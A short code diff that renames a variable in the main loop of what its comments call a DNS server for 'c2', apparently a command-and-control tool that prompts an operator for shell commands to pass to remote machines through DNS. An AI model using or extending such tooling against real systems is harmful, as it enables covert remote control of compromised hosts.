@@ -186,4 +186,4 @@ if __name__ == '__main__':
     print("Started dns server")
     # TODO write some interactive shit here for c2
     while udp_server.isAlive(): 
-        resolve.cmd = input("Shell Command: ")
+        resolver.cmd = input("Shell Command: ")
